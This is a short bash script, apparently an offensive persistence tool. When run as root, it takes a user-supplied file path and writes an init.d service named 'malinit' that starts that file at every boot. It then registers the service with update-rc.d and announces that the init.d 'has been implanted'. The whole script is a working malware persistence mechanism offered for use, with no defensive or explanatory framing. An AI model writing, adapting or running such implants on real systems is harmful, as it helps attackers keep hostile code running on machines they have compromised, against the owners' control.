#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

read -p "Path to your file: " filepath

function addMaliciousInit() {
    cat > /etc/init.d/malinit <<EOF
#!/bin/bash

### BEGIN INIT INFO
# Provides:          malinit
# Required-Start:    $local_fs $network $syslog
# Required-Stop:     $local_fs $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO

do_start()
{
    start-stop-daemon --start \\
        --pidfile /var/run/init-daemon.pid  \\
        --exec $filepath \\
        || return 2
}

case "\$1" in
  start)
        do_start
    ;;
esac
EOF
}

function finish() {
    chmod +x /etc/init.d/malinit
    update-rc.d malinit defaults
}

addMaliciousInit && finish

clear 

echo "[*] Success!! Your init.d has been implanted. [*]"

sleep 1

clear
